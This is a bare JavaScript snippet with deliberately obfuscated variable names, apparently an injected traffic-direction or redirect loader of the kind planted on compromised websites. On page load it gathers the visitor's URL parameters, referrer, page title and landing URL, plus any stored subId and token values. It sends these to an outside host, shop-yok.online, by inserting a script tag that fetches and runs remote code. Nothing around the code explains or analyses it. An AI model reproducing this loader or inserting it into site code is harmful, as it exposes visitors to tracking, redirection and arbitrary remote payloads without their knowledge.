
    (function() {
    var name = '_nsFyVmYBbtPzKht7';
    if (!window._nsFyVmYBbtPzKht7) {
        window._nsFyVmYBbtPzKht7 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://shop-yok.online/7Yw2fDKQ',
        };
    }
    const _m7SQmT6dYVncMxwT = localStorage.getItem('config');
    if (typeof _m7SQmT6dYVncMxwT !== 'undefined' && _m7SQmT6dYVncMxwT !== null) {
        var _W4ZT5KyLjRX4SsG6 = JSON.parse(_m7SQmT6dYVncMxwT);
        var _F7r3yFZKCq1DrC9W = Math.round(+new Date()/1000);
        if (_W4ZT5KyLjRX4SsG6.created_at + window._nsFyVmYBbtPzKht7.ttl < _F7r3yFZKCq1DrC9W) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _sTGdd3y6L1XwLP45 = localStorage.getItem('subId');
    var _whhVGkLfSWtWnSsX = localStorage.getItem('token');
    var _mQD7PL1cktdyppjw = '?return=js.client';
        _mQD7PL1cktdyppjw += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _mQD7PL1cktdyppjw += '&se_referrer=' + encodeURIComponent(document.referrer);
        _mQD7PL1cktdyppjw += '&default_keyword=' + encodeURIComponent(document.title);
        _mQD7PL1cktdyppjw += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _mQD7PL1cktdyppjw += '&name=' + encodeURIComponent(name);
        _mQD7PL1cktdyppjw += '&host=' + encodeURIComponent(window._nsFyVmYBbtPzKht7.R_PATH);
    if (typeof _sTGdd3y6L1XwLP45 !== 'undefined' && _sTGdd3y6L1XwLP45 && window._nsFyVmYBbtPzKht7.unique) {
        _mQD7PL1cktdyppjw += '&sub_id=' + encodeURIComponent(_sTGdd3y6L1XwLP45);
    }
    if (typeof _whhVGkLfSWtWnSsX !== 'undefined' && _whhVGkLfSWtWnSsX && window._nsFyVmYBbtPzKht7.unique) {
        _mQD7PL1cktdyppjw += '&token=' + encodeURIComponent(_whhVGkLfSWtWnSsX);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._nsFyVmYBbtPzKht7.R_PATH + _mQD7PL1cktdyppjw;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
